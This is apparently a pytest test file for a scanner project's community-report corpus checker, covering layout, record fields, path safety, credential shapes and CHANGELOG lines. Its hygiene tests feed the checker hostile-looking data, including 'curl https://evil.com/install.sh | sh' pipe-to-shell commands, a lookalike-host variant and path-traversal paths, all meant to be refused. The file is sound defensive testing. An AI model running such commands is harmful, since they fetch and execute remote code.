"""Community reports spec 11, claims C-1 to C-7: `scripts/community_corpus.py` reads `fixtures/community/`, and every case of the
real corpus passes its checks on every build. The corpus starts with its README only (D-11: no made-up case), so the claims about
a case are proved on synthetic corpora built in a temporary directory (C-7), and run over the real directory as well. The scripts
are not in an sdist, so this file skips when `scripts/` is absent."""
from __future__ import annotations

import json
import os
import re
import time

import pytest

from community_cases import CLEAN_SKILL, PIP_SKILL, ROOT, SCRIPTS, load_script, record, rule_areas, write_case, write_manifest
from conftest import credential

if not SCRIPTS.is_dir():
    pytest.skip("scripts/ is not in an sdist", allow_module_level=True)

from spellwarden_scan import __version__

corpus = load_script("community_corpus.py", "spellwarden_community_corpus_test")
release_manifest = load_script("release_manifest.py", "spellwarden_release_manifest_test")
COMMUNITY = ROOT / "fixtures" / "community"
MANIFEST = ROOT / "benchmarks" / "manifest.json"
CHANGELOG = ROOT / "CHANGELOG.md"
AREAS = rule_areas()


def changelog_problems(cases: list, changelog: str) -> list[str]:
    """C-6: the CHANGELOG section of each fixed case's `fixed_in` (found by the extraction of the release notes) holds the line
    of 6.6, with white space joined as tests/test_compatibility_pledge.py reads a deprecation."""
    problems = []
    for case in cases:
        if case.record.get("outcome") != "fixed":
            continue
        try:
            section = release_manifest.changelog_section(changelog, case.record["fixed_in"])
        except ValueError:
            problems.append(f"{case.id}: the CHANGELOG has no section for {case.record['fixed_in']}")
            continue
        if corpus.changelog_line(case.record) not in " ".join(section.split()):
            problems.append(f"{case.id}: the CHANGELOG section of {case.record['fixed_in']} lacks its line")
    return problems


# --- the real corpus: every build -------------------------------------------------------------------------------------------

def test_the_real_corpus_has_its_readme_and_a_good_layout():
    assert (COMMUNITY / "README.md").is_file()
    assert corpus.layout_problems(COMMUNITY) == []


def test_every_real_record_is_good_and_its_ids_are_unique_and_not_retired():
    cases = corpus.load_cases(COMMUNITY)
    for case in cases:
        assert corpus.record_problems(case.record, directory_name=case.id, rule_areas=AREAS, current_version=__version__) == []
    assert corpus.retired_problems(COMMUNITY, cases) == []


def test_every_real_sample_passes_the_hygiene_checks():
    for case in corpus.load_cases(COMMUNITY):
        assert corpus.sample_problems(case.files, case.record["kept_hosts"]) == [], case.id


@pytest.mark.skipif(not MANIFEST.exists(), reason="benchmarks/ is not in an sdist")
def test_no_real_sample_file_equals_a_file_of_a_test_set():
    for case in corpus.load_cases(COMMUNITY):
        assert corpus.manifest_duplicates(case.files, MANIFEST) == [], case.id


def test_every_fixed_real_case_is_named_in_the_changelog_section_of_its_release():
    assert changelog_problems(corpus.load_cases(COMMUNITY), CHANGELOG.read_text(encoding="utf-8")) == []


def test_f8_the_corpus_is_checked_out_without_line_ending_translation():
    attributes = ROOT / ".gitattributes"
    if not attributes.exists():
        pytest.skip(".gitattributes is not in an sdist")
    assert "fixtures/community/** -text" in attributes.read_text(encoding="utf-8").splitlines()


# --- C-1: the layout ------------------------------------------------------------------------------------------------------

def test_a_corpus_with_only_its_readme_or_with_a_retired_list_passes(tmp_path):
    assert corpus.layout_problems(tmp_path / "missing") == [] and corpus.load_cases(tmp_path / "missing") == []
    (tmp_path / "README.md").write_text("x\n", encoding="utf-8")
    assert corpus.layout_problems(tmp_path) == [] and corpus.load_cases(tmp_path) == []
    (tmp_path / "RETIRED.json").write_text('["COM-0007"]\n', encoding="utf-8")
    write_case(tmp_path)
    assert corpus.layout_problems(tmp_path) == []
    assert [case.id for case in corpus.load_cases(tmp_path)] == ["COM-0001"]


def test_a_stray_file_a_stray_directory_a_missing_member_and_an_extra_member_fail(tmp_path):
    (tmp_path / "notes.txt").write_text("x\n", encoding="utf-8")
    (tmp_path / "other").mkdir()
    write_case(tmp_path, "COM-0001")
    (tmp_path / "COM-0001" / "extra.md").write_text("x\n", encoding="utf-8")
    (tmp_path / "COM-0002").mkdir()
    (tmp_path / "COM-0002" / "record.json").write_text("{}\n", encoding="utf-8")
    (tmp_path / "COM-0003").mkdir()
    (tmp_path / "COM-0003" / "files").mkdir()
    problems = corpus.layout_problems(tmp_path)
    assert any("notes.txt" in text and "not a case" in text for text in problems)
    assert any("other" in text and "not a case id" in text for text in problems)
    assert any("COM-0001" in text and "extra member" in text for text in problems)
    assert any("COM-0002" in text and "files/ is missing" in text for text in problems)
    assert any("COM-0003" in text and "record.json is missing" in text for text in problems)
    assert any("COM-0003" in text and "holds no file" in text for text in problems)
    with pytest.raises(corpus.CorpusError):
        corpus.load_cases(tmp_path)


def test_a_link_in_the_corpus_fails(tmp_path):
    write_case(tmp_path)
    try:
        os.symlink(tmp_path / "COM-0001" / "record.json", tmp_path / "COM-0001" / "files" / "link.md")
    except (OSError, NotImplementedError):
        pytest.skip("links are not allowed here")
    assert any("holds a link" in text for text in corpus.layout_problems(tmp_path))


def test_a_record_that_is_not_json_or_not_canonical_stops_the_loader(tmp_path):
    directory = write_case(tmp_path)
    (directory / "record.json").write_text("{not json", encoding="utf-8")
    with pytest.raises(corpus.CorpusError, match="not UTF-8 JSON"):
        corpus.load_cases(tmp_path)
    (directory / "record.json").write_text(json.dumps(record()), encoding="utf-8")
    with pytest.raises(corpus.CorpusError, match="canonical form"):
        corpus.load_cases(tmp_path)


# --- C-2, C-3: records, ids ------------------------------------------------------------------------------------------------

def _problems(value: object, **options) -> list[str]:
    return corpus.record_problems(value, directory_name="COM-0001", rule_areas=AREAS, current_version="1.24.0", **options)


def test_a_good_record_has_no_problem_and_so_does_a_fixed_one():
    assert _problems(record()) == []
    assert _problems(record(outcome="fixed", fixed_in="1.24.0", credit="Ada Example", kind="false_positive", issue=None)) == []
    assert _problems(record(kept_hosts=["paste.example", "raw.githubusercontent.com"], rule="SW-CFG-001")) == []


@pytest.mark.parametrize("changes, text", [
    ({"id": "COM-0002"}, "is not the name of the directory"),
    ({"id": "COM-2"}, "id must be COM-"),
    ({"kind": "bug"}, "kind must be miss or false_positive"),
    ({"rule": "SW-SKL-999"}, "is not a rule of the baseline"),
    ({"rule": "SW-MCP-001"}, "area mcp"),
    ({"rule": "SW-REG-001"}, "area registry"),
    ({"kept_hosts": ["b.example", "a.example"]}, "sorted"),
    ({"kept_hosts": ["a.example", "a.example"]}, "sorted"),
    ({"kept_hosts": ["https://a.example"]}, "bare lower-case host name"),
    ({"kept_hosts": ["a.example:8080"]}, "bare lower-case host name"),
    ({"kept_hosts": "a.example"}, "kept_hosts must be an array"),
    ({"reported_against": {"scanner": "1.23", "rules": "2026.11.9"}}, "reported_against.scanner"),
    ({"reported_against": {"scanner": "1.23.0", "rules": "2026.11"}}, "reported_against.rules"),
    ({"reported_against": {"scanner": "1.23.0"}}, "exactly scanner and rules"),
    ({"outcome": "closed"}, "outcome must be open or fixed"),
    ({"fixed_in": "1.24.0"}, "null while the outcome is open"),
    ({"outcome": "fixed"}, "fixed_in must be X.Y.Z"),
    ({"outcome": "fixed", "fixed_in": "1.22.0"}, "before the version reported against"),
    ({"outcome": "fixed", "fixed_in": "1.9.0", "reported_against": {"scanner": "1.10.0", "rules": "2026.11.9"}},
     "before the version reported against"),
    ({"outcome": "fixed", "fixed_in": "1.25.0"}, "after this version"),
    ({"credit": ""}, "credit must be null or one trimmed line"),
    ({"credit": " Ada"}, "credit must be null or one trimmed line"),
    ({"credit": "Ada\nExample"}, "credit must be null or one trimmed line"),
    ({"credit": "A" * 81}, "credit must be null or one trimmed line"),
    ({"credit": "[Ada](https://evil.com) @octocat"}, "credit must hold only letters, digits, spaces"),
    ({"credit": "<Ada>"}, "credit must hold only letters, digits, spaces"),
    ({"date": "2026-13-01"}, "date must be YYYY-MM-DD"),
    ({"date": "26-11-25"}, "date must be YYYY-MM-DD"),
    ({"issue": 0}, "issue must be null"),
    ({"issue": True}, "issue must be null"),
])
def test_each_check_of_a_record_has_its_own_problem(changes, text):
    problems = _problems(record(**changes))
    assert any(text in problem for problem in problems), problems


def test_an_unknown_or_missing_member_and_a_record_that_is_no_object_are_problems():
    assert any("unknown member" in text for text in _problems({**record(), "email": "x@example.org"}))
    without = record()
    del without["credit"]
    assert any("member credit is missing" in text for text in _problems(without))
    assert any("must be a JSON object" in text for text in _problems([record()]))


def test_the_versions_are_compared_as_numbers_not_as_text():
    assert _problems(record(outcome="fixed", fixed_in="1.10.0", reported_against={"scanner": "1.9.0", "rules": "2026.11.9"})) == []
    assert any("after this version" in text for text in corpus.record_problems(
        record(outcome="fixed", fixed_in="1.100.0"), directory_name="COM-0001", current_version="1.99.0"))


def test_ids_are_unique_and_not_retired_and_the_next_id_never_reuses_one(tmp_path):
    write_case(tmp_path, "COM-0001")
    write_case(tmp_path, "COM-0002")
    (tmp_path / "RETIRED.json").write_text('["COM-0004", "COM-0002"]\n', encoding="utf-8")
    cases = corpus.load_cases(tmp_path)
    assert corpus.retired_problems(tmp_path, cases) == ["COM-0002: a retired id is used by a case"]
    assert corpus.next_id(tmp_path) == "COM-0005"
    assert corpus.next_id(tmp_path / "missing") == "COM-0001"
    assert corpus.retired_problems(tmp_path, [cases[0], cases[0]])[0] == "COM-0001: the id is used twice"
    (tmp_path / "RETIRED.json").write_text('["nope"]\n', encoding="utf-8")
    with pytest.raises(corpus.CorpusError, match="RETIRED.json"):
        corpus.next_id(tmp_path)
    assert "RETIRED.json" in corpus.retired_problems(tmp_path, cases)[0]


# --- C-4: the sample --------------------------------------------------------------------------------------------------------

def test_a_good_sample_passes_and_an_empty_one_does_not():
    assert corpus.sample_problems({"SKILL.md": PIP_SKILL.encode(), "scripts/run.sh": b"echo hello\n"}) == []
    assert corpus.sample_problems({}) == ["the sample has no file"]


@pytest.mark.parametrize("path, text", [
    ("../x.md", "a segment .."),
    ("./x.md", "a segment ."),
    ("/x.md", "not relative"),
    ("C:/x.md", "not relative"),
    ("a\\b.md", "backslash"),
    ("a//b.md", "empty segment"),
    ("a/", "empty segment"),
    ("a.md.", "ends in a dot or a space"),
    ("a /b.md", "ends in a dot or a space"),
    ("CON", "reserved Windows name"),
    ("docs/nul.txt", "reserved Windows name"),
    ("LPT1.md", "reserved Windows name"),
    ("a:b.md", "Windows does not allow"),
    ("a?.md", "Windows does not allow"),
    (".git/config", "under .git"),
    (".GIT/config", "under .git"),
    ("a/" * 101 + "b.md", "longer than 200"),
])
def test_each_unsafe_path_is_refused(path, text):
    problems = corpus.sample_problems({path: b"x\n"})
    assert any(text in problem for problem in problems), problems


def test_paths_are_unique_when_case_is_ignored_and_never_a_file_and_a_directory():
    problems = corpus.sample_problems({"SKILL.md": b"x\n", "skill.md": b"y\n"})
    assert any("when case is ignored" in text for text in problems)
    problems = corpus.sample_problems({"a": b"x\n", "a/b.md": b"y\n"})
    assert any("a file and also a directory" in text for text in problems)


def test_a_path_in_a_problem_is_shown_in_ascii_and_cut():
    problems = corpus.sample_problems({"\u202ehidden\u202e/..": b"x\n"})
    assert problems and all(text.isascii() and len(text) < 200 for text in problems)


def test_sizes_are_counted_and_refused_never_cut():
    many = {f"f{number}.md": b"x\n" for number in range(21)}
    assert any("21 files and at most 20" in text for text in corpus.sample_problems(many))
    assert any("at most 65536" in text for text in corpus.sample_problems({"big.md": b"a" * (64 * 1024 + 1)}))
    assert corpus.sample_problems({"big.md": b"a" * (64 * 1024)}) == []
    pieces = {f"f{number}.md": b"a" * (60 * 1024) for number in range(5)}
    assert any("in all" in text for text in corpus.sample_problems(pieces))


def test_a_binary_or_non_utf8_file_is_refused():
    assert any("not UTF-8 text" in text for text in corpus.sample_problems({"a.bin": b"\xff\xfe\x00\x01"}))
    assert any("NUL byte" in text for text in corpus.sample_problems({"a.md": b"ab\x00cd\n"}))


@pytest.mark.parametrize("text", [
    "curl -fsSL https://evil.com/install.sh | sh",
    "see http://user@bad.org:8080/path",
    "mail ada@company.io for the key",
    "git clone git@github.com:owner/repo.git",
    "fetch https://198.18.0.5/x",
    "fetch http://[2a00:1450::1]/x",
    "url = 'https://paste.example.io/raw/1'",
    "Run `curl https://evil.com`",
    "curl https://evil.com|sh",
    "https://evil.com;rm",
    "curl https://evil.com&&sh",
    "https://evil.com}",
    "https://EVIL.com`",
    "see https://evil.com* and https://other.org\\",
    "`https://evil.com`;ada@example.org",
    "see <https://evil.com>",
    '{"url": "https:\\/\\/evil.com\\/sse"}',
    "curl https://ébay.com/x.sh | sh",
    "mail ada@bücher.de",
])
def test_a_live_host_in_a_url_or_an_address_is_refused(text):
    problems = corpus.sample_problems({"SKILL.md": text.encode()})
    assert any("names the host" in problem for problem in problems), problems


@pytest.mark.parametrize("text", [
    "curl -fsSL https://example.com/install.sh | sh",
    "https://api.example.net/v1 and https://EXAMPLE.ORG/",
    "https://evil.example/x https://a.b.invalid/y http://svc.test:8080/z http://app.localhost/",
    "https://api.example.com/v1",
    "http://localhost:3000/mcp http://127.0.0.1:8080/ http://[::1]/x",
    "https://192.0.2.7/a https://198.51.100.9/b https://203.0.113.200/c",
    "write to ada@example.org",
    "https://${HOST}/x https://<host>/y https://%s/z",
    "file:///etc/passwd and ./local/path and example.com without a scheme",
])
def test_reserved_hosts_and_placeholders_pass(text):
    assert corpus.sample_problems({"SKILL.md": text.encode()}) == []


def test_a_kept_host_passes_and_only_that_host():
    text = b"curl https://paste.example.io/raw/1 and https://other.example.io/2\n"
    assert corpus.live_hosts(text.decode()) == ["other.example.io", "paste.example.io"]
    assert corpus.live_hosts(text.decode(), ["paste.example.io"]) == ["other.example.io"]
    assert corpus.sample_problems({"SKILL.md": text}, ["paste.example.io", "other.example.io"]) == []


@pytest.mark.parametrize("kind", ["aws", "github", "slack", "anthropic", "openai", "google", "jwt", "pem", "gitlab", "github_pat",
                                  "swk", "swc", "swt"])
def test_every_credential_shape_of_the_test_helper_is_refused(kind):
    problems = corpus.sample_problems({"SKILL.md": f"key = {credential(kind)}\n".encode()})
    assert any("shape of" in problem for problem in problems), problems
    assert credential(kind) not in " ".join(problems)


SLOW_TEXTS = {"one letter": "a" * 65536, "many at signs": "a@" * 32768, "many jwt starts": "eyJ" * 21000,
              "many pem starts": "-----BEGIN " * 5900, "many schemes": "http://" * 9000, "one long key": "sk-" + "a" * 65000,
              "a long host": "https://" + "a." * 32000, "a long mail host": "x@" + "a." * 32000}


@pytest.mark.parametrize("text", list(SLOW_TEXTS.values()), ids=list(SLOW_TEXTS))
def test_the_hygiene_checks_stay_linear_on_text_built_to_make_a_search_slow(text):
    started = time.perf_counter()
    corpus.sample_problems({"SKILL.md": text.encode()})
    assert time.perf_counter() - started < 5.0


def test_a_password_line_with_a_placeholder_is_not_a_credential_shape():
    assert corpus.sample_problems({"config.md": (credential("password") + "\n").encode()}) == []
    assert corpus.sample_problems({"config.md": b"token = REDACTED\nsk-short\n"}) == []


# --- C-5: the test sets -----------------------------------------------------------------------------------------------------

def test_a_file_equal_to_a_test_set_file_is_found_by_its_hash_and_a_tuning_one_is_not(tmp_path):
    taken = (PIP_SKILL + "# a test-set sample of more than two hundred bytes " + "x" * 200 + "\n").encode()
    tuned = (CLEAN_SKILL + "# a tuning-set sample of more than two hundred bytes " + "y" * 200 + "\n").encode()
    short = b"short\n"
    manifest = write_manifest(tmp_path / "manifest.json", test=[taken, short], tuning=[tuned])
    found = corpus.manifest_duplicates({"SKILL.md": taken, "a.md": tuned, "b.md": short}, manifest)
    assert found == ["'SKILL.md': the file equals a file of a set that the benchmark keeps as a test set"]
    assert corpus.manifest_duplicates({"SKILL.md": taken + b"changed\n"}, manifest) == []
    with pytest.raises(corpus.CorpusError, match="manifest"):
        corpus.manifest_duplicates({"SKILL.md": taken}, tmp_path / "missing.json")


# --- C-6: the CHANGELOG line ------------------------------------------------------------------------------------------------

def test_the_changelog_line_names_the_credit_exactly_when_the_record_has_one():
    assert corpus.changelog_line(record(credit="Ada Example")) == \
        "Community report COM-0001 (SW-SKL-009, missed detection), reported by Ada Example."
    assert corpus.changelog_line(record("COM-0002", kind="false_positive", rule="SW-SKL-014")) == \
        "Community report COM-0002 (SW-SKL-014, false positive)."


def test_a_fixed_case_needs_its_line_in_the_section_of_its_release(tmp_path):
    write_case(tmp_path, "COM-0001", outcome="fixed", fixed_in="1.24.0", credit="Ada Example")
    write_case(tmp_path, "COM-0002", outcome="fixed", fixed_in="1.24.0", kind="false_positive", rule="SW-SKL-014")
    write_case(tmp_path, "COM-0003")
    cases = corpus.load_cases(tmp_path)
    good = ("# Changelog\n\n## 1.24.0\n\nRules version 2026.11.10: x.\n\n- Community report COM-0001 (SW-SKL-009, missed\n"
            "  detection), reported by Ada Example.\n- Community report COM-0002 (SW-SKL-014, false positive).\n\n"
            "## 1.23.0 (2026-11-24)\n\nOld.\n")
    assert changelog_problems(cases, good) == []
    assert changelog_problems(cases, good.replace("## 1.24.0", "## 1.24.0 (2026-12-01)")) == []
    assert changelog_problems(cases, good.replace(", reported by Ada Example", "")) == ["COM-0001: the CHANGELOG section of 1.24.0 lacks its line"]
    assert changelog_problems(cases, good.replace("(SW-SKL-014, false positive).", "(SW-SKL-014, false positive), reported by Ada.")) \
        == ["COM-0002: the CHANGELOG section of 1.24.0 lacks its line"]
    assert changelog_problems(cases, good.replace("## 1.24.0", "## 1.25.0")) == [
        "COM-0001: the CHANGELOG has no section for 1.24.0", "COM-0002: the CHANGELOG has no section for 1.24.0"]
    assert changelog_problems(cases, good.replace("- Community report COM-0001", "- Community report COM-0001 ", 1)) == []


# --- the text of an issue form and the digests ------------------------------------------------------------------------------

BODY = ("### Scanner version and rules version\n\nspellwarden 1.23.0 (rules 2026.11.9)\n\n### Name to credit (optional)\n\n_No response_\n\n"
        "### A sample\n\n```text\nline one\n### not a heading\nline three\n```\n\n### More files\n\n"
        "````text\n=== a.md ===\n```\ninner\n```\n````\n\n### Publishing\n\n- [x] ticked\n")


def test_an_issue_body_is_read_by_the_label_of_each_field_with_fences_and_no_response():
    answers = corpus.parse_issue_body(BODY)
    assert answers == {"Scanner version and rules version": "spellwarden 1.23.0 (rules 2026.11.9)", "Name to credit (optional)": "",
                       "A sample": "line one\n### not a heading\nline three", "More files": "=== a.md ===\n```\ninner\n```",
                       "Publishing": "- [x] ticked"}


def test_crlf_line_endings_are_read_as_lf_and_the_last_answer_of_a_label_wins():
    assert corpus.parse_issue_body(BODY.replace("\n", "\r\n")) == corpus.parse_issue_body(BODY)
    spoofed = "### Publishing\n\n- [x] ticked\n\n### Publishing\n\n- [ ] not ticked\n"
    assert corpus.parse_issue_body(spoofed) == {"Publishing": "- [ ] not ticked"}
    assert corpus.parse_issue_body("text before\n### A\n\nb\n") == {"A": "b"}
    assert corpus.parse_issue_body("### A\n\n```text\nopen and never closed\n### B\n\nc\n") == {"A": "```text\nopen and never closed\n### B\n\nc"}


def test_sample_text_becomes_file_bytes_with_lf_and_one_final_newline():
    assert corpus.file_bytes("a\r\nb\r\n\r\n") == b"a\nb\n"
    assert corpus.file_bytes("a") == b"a\n" and corpus.file_bytes("") == b"" and corpus.file_bytes("\n\n") == b""
    assert corpus.file_bytes("caf\u00e9") == "caf\u00e9\n".encode("utf-8")


def test_the_other_files_are_split_on_marker_lines():
    files, problems = corpus.split_files("=== a.md ===\none\ntwo\n\n=== scripts/run.sh ===\necho hi\n")
    assert files == {"a.md": "one\ntwo\n", "scripts/run.sh": "echo hi\n"} and problems == []
    assert corpus.split_files("") == ({}, [])
    assert corpus.split_files("stray\n=== a.md ===\nx\n")[1] == ["the other files start with text before the first line `=== path ===`"]
    assert corpus.split_files("=== a.md ===\nx\n=== a.md ===\ny\n")[1] == ["'a.md': the path is given twice in the other files"]
    assert corpus.split_files("=== a.md ===\r\nx\r\n")[0] == {"a.md": "x\n"}


def test_the_digests_are_stable_and_change_with_any_byte(tmp_path):
    write_case(tmp_path, "COM-0001")
    write_case(tmp_path, "COM-0002", files={"SKILL.md": CLEAN_SKILL}, kind="false_positive")
    cases = corpus.load_cases(tmp_path)
    digest = corpus.corpus_sha256(cases)
    assert re.fullmatch("[0-9a-f]{64}", digest) and digest == corpus.corpus_sha256(list(reversed(cases)))
    changed = [cases[0]._replace(files={"SKILL.md": b"x"}), cases[1]]
    assert corpus.corpus_sha256(changed) != digest
    assert corpus.corpus_sha256([cases[0]._replace(record={**cases[0].record, "credit": "Ada"}), cases[1]]) != digest
    assert corpus.files_digest({"a": b"1", "b": b"2"}) == corpus.files_digest({"b": b"2", "a": b"1"})
    assert corpus.files_digest({"a": b"1"}) != corpus.files_digest({"b": b"1"})
